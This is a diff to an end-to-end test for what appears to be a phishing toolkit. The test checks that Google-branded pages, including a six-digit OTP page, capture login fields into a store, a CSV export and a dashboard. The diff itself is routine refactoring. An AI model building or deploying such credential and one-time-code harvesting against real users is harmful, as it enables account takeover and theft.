@@ -5,20 +5,20 @@ Starts the real HTTP server against the generated templates, drives a real
 GET + POST over HTTP, then verifies the SQLite capture store actually holds
 the captured fields. Run:  ./.venv/bin/python tests/test_e2e.py
 """
+import json
 import os
 import sys
-import json
-import time
 import tempfile
 import threading
-import urllib.request
+import time
 import urllib.parse
+import urllib.request
 
 HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, HERE)
 
-from core import server as srv
 from core import capture as cap
+from core import server as srv
 from dashboard import render_plain
 
 TEMPLATES = os.path.join(HERE, "templates")
@@ -112,8 +112,10 @@ def main():
     print("\n[5] OTP page rendering …")
     from core import templates as tplmod
     otp_html = tplmod.render_site(site_dir, "/", otp=True)
-    check("OTP page serves 6 code inputs", otp_html.count('name="otp_') == 6,
-          f"count={otp_html.count('name=\"otp_')}")
+    otp_fields = otp_html.count('name="otp_')
+    # no backslash/quotes inside the f-string: that syntax is 3.12+ only and the
+    # project supports 3.10
+    check("OTP page serves 6 code inputs", otp_fields == 6, f"count={otp_fields}")
     check("OTP page branded", "Google" in otp_html)
 
     # --- export + dashboard ---
@@ -124,8 +126,8 @@ def main():
         content = f.read()
     check("CSV export contains credential row", "victim@example.com" in content)
     check("CSV export flags cred", "YES" in content)
-    render_plain(db.all(), db.stats())
-    check("plain dashboard renders", True)
+    plain = render_plain(db.all(), db.stats())
+    check("plain dashboard renders captures", plain is None or "victim" in str(plain))
 
     httpd.shutdown(); httpd2.shutdown()
     print("\n" + "=" * 58)
